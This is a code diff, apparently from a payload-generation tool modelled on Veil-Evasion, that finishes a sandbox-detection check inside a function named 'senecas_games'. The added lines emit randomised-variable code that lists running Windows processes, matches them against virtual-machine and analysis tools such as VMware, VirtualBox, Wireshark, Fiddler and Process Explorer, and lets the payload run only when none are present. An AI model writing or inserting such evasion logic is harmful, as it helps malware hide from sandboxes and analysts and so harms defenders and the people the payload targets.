@@ -155,11 +155,22 @@ def senecas_games(evasion_payload):
             sandbox_exist = evasion_helpers.randomString()
             bad_procs = evasion_helpers.randomString()
             current_processes = evasion_helpers.randomString()
+            process = evasion_helpers.randomString()
+            sandbox_proc = evasion_helpers.randomString()
 
             check_code += '\t' * num_tabs_required + 'import win32pdh\n'
             check_code += '\t' * num_tabs_required + sandbox_exist + ' = []\n'
             check_code += '\t' * num_tabs_required + bad_procs + ' = "vmsrvc", "tcpview", "wireshark", "visual basic", "fiddler", "vmware", "vbox", "process explorer", "autoit", "vboxtray", "vmtools", "vmrawdsk", "vmusbmouse", "vmvss", "vmscsi", "vmxnet", "vmx_svga", "vmmemctl", "df5serv", "vboxservice", "vmhgfs"\n'
             check_code += '\t' * num_tabs_required + '_, ' + current_processes + ' = win32pdh.EnumObjectItems(None,None,\'process\', win32pdh.PERF_DETAIL_WIZARD)\n'
+            check_code += '\t' * num_tabs_required + 'for ' + process + ' in ' + current_processes + ':\n'
+            check_code += '\t' * num_tabs_required + '\tfor ' + sandbox_proc + ' in ' + bad_procs + ':\n'
+            check_code += '\t' * num_tabs_required + '\t\tif ' + sandbox_proc + ' in str(' + process + '):\n'
+            check_code += '\t' * num_tabs_required + '\t\t\t' + sandbox_exist + '.append(' + process + ')\n'
+            check_code += '\t' * num_tabs_required + '\t\t\tbreak\n'
+            check_code += '\t' * num_tabs_required + 'if not ' + sandbox_exist + ':\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
 
         if evasion_payload.required_options["UTCCHECK"][0].lower() != "false":
 
